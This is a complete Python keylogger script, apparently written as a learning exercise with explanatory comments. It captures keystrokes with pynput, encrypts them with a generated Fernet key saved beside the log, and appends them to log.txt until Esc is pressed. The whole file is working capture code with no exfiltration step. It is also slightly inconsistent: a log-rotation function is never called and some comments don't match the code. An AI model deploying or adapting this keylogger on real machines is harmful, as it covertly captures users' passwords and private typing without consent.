import os
from pynput import keyboard
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet

counter = 0
keys = []
max_log_size = 1 * 1024 * 1024 # 1MB

#line 11: we generate a key for the encryption
#line 12: saving this key to be used in the decryption 

superkey = Fernet.generate_key()
cipher_suite = Fernet(superkey)

with open("encryption_key.key", "wb") as key_file:
    key_file.write(superkey)

#this function will rotate the log file if it reaches the max size
def rotate_log_file():
    if os.path.exists("log.txt") and os.path.getsize("log.txt") >= max_log_size:
        os.rename("log.txt", "log.txt.bak")

def where_press(key):
    global keys, counter

    keys.append(key)
    counter += 1
    print("{0} pressed".format(key))

    if counter >= 5:
        counter = 0
        write_file(keys)
        keys = [] 
    
def write_file(keys):
    with open("log.txt", "a") as f: #we could use w, as it stands for write, after this, we have to use "a" (only if we don't have a file created before) as it stands for append, so it will append the new keys to the file
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                encrypted_data = cipher_suite.encrypt(b"\n")
            elif k.find("Key") == -1:
                encrypted_data = cipher_suite.encrypt(k.encode())
            else:
                continue
            f.write(encrypted_data.decode() + "\n") #adding the \n means that after each key press, it will go to a new line; so text will be printed vertically

def where_release(key): 
    if key == Key.esc: #esc stands for escape!
        if keys: #this ensures every character is written to the file even if the user presses escape
            write_file(keys)
        return False


with Listener(on_press = where_press, on_release = where_release) as listener:
    listener.join() 
